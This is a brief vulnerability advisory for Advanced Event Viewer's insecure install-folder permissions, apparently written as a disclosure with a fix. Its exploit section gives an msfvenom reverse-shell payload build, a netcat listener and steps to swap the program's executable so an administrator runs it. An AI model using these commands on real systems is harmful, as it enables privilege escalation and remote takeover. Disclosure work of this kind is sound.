# Vulnerability
Advanced Event Viewer installs by default to "C:\Program Files\Advanced Event Viewer" with insecure folder permissions granting 
Everyone full permission to the contents of the directory and subfolders. This allows an attacker the opportunity to replace the 
code with their own.  Seeing how this program is geared towards administrators it makes it perfect for privilege escalation.
 
C:\Program Files>icacls  "Advanced Event Viewer"
					  <br>Advanced Event Viewer Everyone:(F)
                <br><b>Everyone:(OI)(CI)(IO)(F)</b>
                    <br>  NT SERVICE\TrustedInstaller:(I)(F)
                      <br>NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                      <br>NT AUTHORITY\SYSTEM:(I)(F)
                      <br>NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                      <br>BUILTIN\Administrators:(I)(F)
                      <br>BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                      <br>BUILTIN\Users:(I)(RX)
                      <br>BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                      <br>CREATOR OWNER:(I)(OI)(CI)(IO)(F)
 
# Exploit
1. Generate reverse shell .exe
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.149 LPORT=443 -f exe > /var/www/html/aev.exe

2. Login as regular user, download and replace aev.exe, logout
 
3. Setup listener on attacking machine
	nc -nlvvp 443
	
4. Wait for execution by administrator

# Prerequisites
To successfully exploit this vulnerability, an attacker must already have access 
to a system running Advanced Event Viewer using a low-privileged user account

# Risk
The vulnerability allows local attackers to escalate privileges and execute
arbitrary code as the user who executes.

# Fix
Update folder permissions

# Disclaimer
Content is for educational and research purposes only. Author doesnâ€™t hold any responsibility over the misuse of the software, exploits or security findings contained herein and does not condone them whatsoever.
